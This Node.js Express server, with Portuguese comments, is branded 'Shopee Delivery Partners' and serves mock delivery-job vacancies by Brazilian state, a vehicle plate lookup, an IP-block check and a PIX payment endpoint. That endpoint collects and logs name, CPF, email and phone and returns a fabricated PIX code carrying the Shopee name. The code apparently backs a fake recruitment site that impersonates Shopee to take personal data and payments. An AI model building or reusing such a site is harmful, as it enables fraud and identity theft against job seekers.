// Servidor de produção que serve o Vite diretamente como no Replit
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const { spawn } = require('child_process');

// Configuração
const PORT = process.env.PORT || 5000;
const VITE_PORT = 3000;

// Inicializar o Express
const app = express();

// Middlewares essenciais
app.use(cors({
  origin: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Lista completa de estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

console.log('Iniciando servidor Heroku Production...');

// Iniciar Vite em modo desenvolvimento
let viteProcess;
let viteReady = false;

function startVite() {
  console.log('Iniciando Vite em modo desenvolvimento...');
  viteProcess = spawn('npx', ['vite', '--host', '0.0.0.0', '--port', VITE_PORT], {
    stdio: 'pipe',
    env: { 
      ...process.env, 
      PORT: VITE_PORT,
      NODE_ENV: 'development'
    }
  });

  viteProcess.stdout.on('data', (data) => {
    const output = data.toString();
    console.log('Vite:', output);
    if (output.includes('Local:') || output.includes('ready')) {
      viteReady = true;
      console.log('✅ Vite está pronto!');
    }
  });

  viteProcess.stderr.on('data', (data) => {
    console.log('Vite Error:', data.toString());
  });

  viteProcess.on('close', (code) => {
    console.log(`Vite process exited with code ${code}`);
    viteReady = false;
    if (code !== 0) {
      console.log('Reiniciando Vite em 5 segundos...');
      setTimeout(startVite, 5000);
    }
  });
}

// Middleware para log de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Rota de verificação de saúde/status
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'development',
    port: PORT,
    vite_port: VITE_PORT
  });
});

// Rota de regiões
app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

// Simulação da API de consulta de veículos
app.get('/api/vehicle-info/:placa', (req, res) => {
  const { placa } = req.params;
  
  console.log(`Consultando veículo: ${placa}`);
  
  const mockVehicleData = {
    MARCA: "VOLKSWAGEN",
    MODELO: "GOL",
    SUBMODELO: "1.0 MI",
    VERSAO: "CITY",
    ano: "2020",
    anoModelo: "2020",
    chassi: "9BWZZZ377VT004251",
    codigoSituacao: "0",
    cor: "BRANCA"
  };
  
  res.json(mockVehicleData);
});

// Verificação de status de IP
app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

// Configuração para pagamentos
app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  console.log('Enviando resposta de pagamento:', pixResponse);
  res.json(pixResponse);
});

// Middleware para tratar rotas não encontradas da API
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Middleware para verificar se deve usar proxy ou fallback
app.use('/', (req, res, next) => {
  // Se for rota da API, deixar passar para as rotas definidas acima
  if (req.path.startsWith('/api/') || req.path === '/health') {
    return next();
  }

  // Se Vite não estiver pronto, mostrar página de loading
  if (!viteReady) {
    return res.type('html').send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners - Carregando</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: white;
                padding: 3rem;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
                text-align: center;
                max-width: 500px;
                width: 90%;
            }
            .loading {
                display: inline-block;
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #E83D22;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin-bottom: 2rem;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            h1 { color: #E83D22; }
            .progress {
                background: #f0f0f0;
                border-radius: 20px;
                padding: 3px;
                margin: 20px 0;
            }
            .progress-bar {
                background: linear-gradient(45deg, #E83D22, #FF6B4A);
                height: 20px;
                border-radius: 20px;
                animation: progress 3s infinite;
            }
            @keyframes progress {
                0% { width: 10%; }
                50% { width: 70%; }
                100% { width: 90%; }
            }
        </style>
        <script>
            let attempts = 0;
            function checkVite() {
                attempts++;
                fetch('/health')
                  .then(response => response.json())
                  .then(data => {
                    if (data.status === 'ok') {
                      setTimeout(() => window.location.reload(), 1000);
                    } else {
                      setTimeout(checkVite, 2000);
                    }
                  })
                  .catch(() => {
                    if (attempts < 10) {
                      setTimeout(checkVite, 2000);
                    } else {
                      document.querySelector('.container').innerHTML = 
                        '<h1>Shopee Delivery Partners</h1><p>Erro ao carregar. <button onclick="window.location.reload()">Tentar novamente</button></p>';
                    }
                  });
            }
            setTimeout(checkVite, 3000);
        </script>
    </head>
    <body>
        <div class="container">
            <div class="loading"></div>
            <h1>Shopee Delivery Partners</h1>
            <p>Preparando sua aplicação...</p>
            <div class="progress">
                <div class="progress-bar"></div>
            </div>
            <small>Aguarde alguns instantes</small>
        </div>
    </body>
    </html>
    `);
  }

  // Se Vite estiver pronto, usar proxy
  const proxy = createProxyMiddleware({
    target: `http://localhost:${VITE_PORT}`,
    changeOrigin: true,
    ws: true,
    timeout: 30000,
    onError: (err, req, res) => {
      console.log('Proxy error:', err.message);
      viteReady = false; // Marcar como não pronto se houver erro
      res.status(503).type('html').send(`
        <html><body><h1>Erro temporário</h1><p>Recarregando...</p><script>setTimeout(() => window.location.reload(), 2000);</script></body></html>
      `);
    }
  });

  proxy(req, res, next);
});

// Iniciar Vite primeiro
startVite();

// Aguardar um momento para Vite iniciar, então iniciar o servidor principal
setTimeout(() => {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor Heroku Production rodando na porta ${PORT}`);
    console.log(`Proxy configurado para Vite na porta ${VITE_PORT}`);
    console.log(`Ambiente: ${process.env.NODE_ENV || 'development'}`);
  });
}, 2000);

// Cleanup na saída
process.on('SIGTERM', () => {
  if (viteProcess) {
    viteProcess.kill();
  }
  process.exit(0);
});

process.on('SIGINT', () => {
  if (viteProcess) {
    viteProcess.kill();
  }
  process.exit(0);
});